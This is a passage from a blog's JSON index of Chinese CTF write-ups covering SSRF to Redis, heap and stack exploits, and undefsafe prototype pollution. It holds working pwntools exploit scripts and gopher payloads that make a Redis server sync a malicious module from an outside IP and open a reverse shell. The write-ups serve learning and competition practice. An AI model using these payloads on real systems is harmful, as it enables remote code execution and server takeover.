notebook size : &#x27;)r.send(bytes(str(0x20000), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;Give your title size : &#x27;)r.send(bytes(str(0xf7d22714 - 0xf7d01008 - 16), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;invalid ! please re-enter :\\n&#x27;)r.send(b&#x27;4&#x27;)r.recvuntil(&#x27;Give your title : &#x27;)r.send(&#x27;a&#x27;)r.recvuntil(&#x27;Give your note : &#x27;)r.send(&#x27;aaaa&#x27;)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104479071\n(我挺喜欢这个博主的不过他这次是伪造的link_map把我都看蒙了，后面发现都用的p32那就用32位的方式伪造呗，这样简便很多)\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve","劫持TLS结构"]},{"title":"网鼎杯_2020_玄武组_SSRFMe","url":"/2021/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/","content":"题目源码&lt;?phpfunction check_inner_ip($url)&#123;    $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url);    if (!$match_result)    &#123;        die(&#x27;url fomat error&#x27;);    &#125;    try    &#123;        $url_parse=parse_url($url);    &#125;    catch(Exception $e)    &#123;        die(&#x27;url fomat error&#x27;);        return false;    &#125;    $hostname=$url_parse[&#x27;host&#x27;];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123;    if (check_inner_ip($url))    &#123;        echo $url.&#x27; is inner ip&#x27;;    &#125;    else    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info[&#x27;redirect_url&#x27;])        &#123;            safe_request_url($result_info[&#x27;redirect_url&#x27;]);        &#125;        curl_close($ch);        var_dump($output);    &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = $_GET[&#x27;url&#x27;];    if(!empty($url))&#123;        safe_request_url($url);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt;\n\n在这里只允许使用http/https/gopher/dict协议，并且禁止了一些ip，查看hint很简单，直接0.0.0.0就行\nstring(1342) &quot; &lt;?phpif($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123;  highlight_file(__FILE__);&#125;if(isset($_POST[&#x27;file&#x27;]))&#123;  file_put_contents($_POST[&#x27;file&#x27;],&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;.$_POST[&#x27;file&#x27;]);&#125;&quot;\n\n返回了这样的数据，直接写了redis的密码是root，又有gopher协议，思路就清晰了。\n利用思路构造一个恶意的redis服务器https://github.com/xmsec/redis-ssrf然后让远程的redis连接到恶意的redis服务器，紧接着远程主机会同步恶意主机的exp，然后控制主机连接本地监听就可以getshell了\ngopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquitgopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520103.215.81.199%252010977%250d%250aquit\n\n第一步是将dir设置为/tmp/，第二步是将dbfilename设置为exp.so然后设置连接到我们的服务\ngopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%2520103.215.81.199%252010232%250d%250aquit\n\n这一步是让目标主机使用这个应用这个exp文件然后远程连接我们的服务\n\n这样就获得了反弹shell，穷困大学生没有服务器就用的隧道来代替\n","categories":["web-buuctf"],"tags":["ssrf","redis主从复制"]},{"title":"长安“战疫”网络安全卫士守护赛wp","url":"/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/","content":"总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。\npwn1add esp, 10hmov eax, 0mov ecx, [ebp+var_4]leavelea esp,[ecx-4]retn\n\n注意程序不是从原本的位置开始ret就好了\nfrom pwn import *elf = ELF(&#x27;./pwn1&#x27;)# r = process(&#x27;./pwn1&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16088)shell_addr = 0x8048540r.recvuntil(b&#x27;Gift:&#x27;)buf_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True)[2:], 16)payload = b&#x27;a&#x27;*(0x38-0x4)+p32(buf_addr+0x38+8)+p32(0)+p32(shell_addr)# r.sendline(b&#x27;a&#x27;*(0x38+0x4))r.sendline(payload)r.interactive()\n\npwn2off by one程序在create的时候存在off by one漏洞，具体思路，覆盖下方chunk，释放chunk进入unsortedbin泄漏main_arena，释放chunk进入tcache修改到malloc上面的地址\nfrom pwn import *elf = ELF(&#x27;./pwn2&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)# r = process(&#x27;./pwn2&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16066)context.log_level = &#x27;debug&#x27;one_gadget = 0x10a41cdef create(size, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x68)    # 0create(0x100, b&#x27;a&#x27;*0x100)  # 1create(0x68, b&#x27;a&#x27;*0x68)    # 2create(0x88, b&#x27;a&#x27;*0x88)    # 3create(0xf8, b&#x27;a&#x27;*0xf8)    # 4create(0x88, b&#x27;a&#x27;*0x88)    # 5# delete(9)delete(0)create(0x68, b&#x27;a&#x27;*(0x68-0x8)+p64(0)+b&#x27;\\x80&#x27;)  # 0# 让chunk1覆盖掉chunk2delete(1)create(0x170, b&#x27;a&#x27;)  # 1delete(3)create(0x88, b&#x27;a&#x27;*(0x88-0x8)+p64(0)+b&#x27;\\x90&#x27;)  # 3delete(4)# chunk4覆盖掉chunk5create(0x180, b&#x27;a&#x27;)  # 4for i in range(7):    create(0x88, b&#x27;a&#x27;)for i in range(7):    delete(12-i)delete(5)# 让chunk5进入unsortedbin获得main_arena地址edit(4, b&#x27;a&#x27;*(0xf8+0x8-1))show(4)r.recvuntil(b&#x27;aaaaaaaaaaaaaa\\n&#x27;)main_arena_88 = u64(r.recvuntil(b&#x27;1.Add&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+one_gadgetdelete(2)edit(1, b&#x27;a&#x27;*(0x100)+p64(0)+p64(0x70)+p64(malloc_hook-0x10))  # 2# 释放chunk2，进入tcache，修改fd指针create(0x68, b&#x27;a&#x27;)# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x10+p64(one_gadget))# 修改malloc_hookr.recvuntil(b&#x27;Choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size: &#x27;)r.sendline(b&#x27;1&#x27;)# getshellr.interactive()\n\n自己还是在常见的漏洞上面出现问题比如这次的off by one还有off by null都还没去了解，所以下来会去了解这方面的漏洞原理和利用方式。\n","categories":["比赛wp"],"tags":["pwn"]},{"title":"网鼎杯_2020_青龙组_notes","url":"/2021/11/22/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/","content":"知识点源代码中undefsafe不知道是什么搜了一下就出现了unsafe漏洞\nhttps://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/\n// 上面链接里面的内容var a = require(&quot;undefsafe&quot;);var test = &#123;&#125;console.log(&#x27;this is &#x27;+test)// this is [object Object]a(test,&#x27;__proto__.toString&#x27;,function()&#123; return &#x27;just a evil!&#x27;&#125;)console.log(&#x27;this is &#x27;+test)// this is just a evil!\n\n代码审计题目直接给了源码\nvar express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);const undefsafe = require(&#x27;undefsafe&#x27;);const &#123; exec &#125; = require(&#x27;child_process&#x27;);var app = express();class Notes &#123;    constructor() &#123;        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r = &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);&#125;);app.route(&#x27;/add_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);    &#125;)    .post(function(req, res) &#123;        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/edit_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/delete_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/notes&#x27;)    .get(function(req, res) &#123;        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) &#123;            a_note = notes.get_all_notes();        &#125; else &#123;            a_note = notes.get_note(q);        &#125;        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);    &#125;)app.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#x27;Sorry cant find that!&#x27;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#x27;Something broke!&#x27;);&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))\n\n可以看到漏洞函数很明显\nedit_note(id, author, raw) &#123;    undefsafe(this.note_list, id + &#x27;.author&#x27;, author);    undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);&#125;\n\n并且三个参数都是可控的，所以可以造成原型链污染\napp.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)\n\n然后这里又是for循环执行命令\n利用过程其实思路就很明显了，污染commands然后执行我们想要的命令就可以了\n\n就可以获得反弹shell了\n","categories":["web-buuctf"],"tags":["原型链污染","代码审计"]}]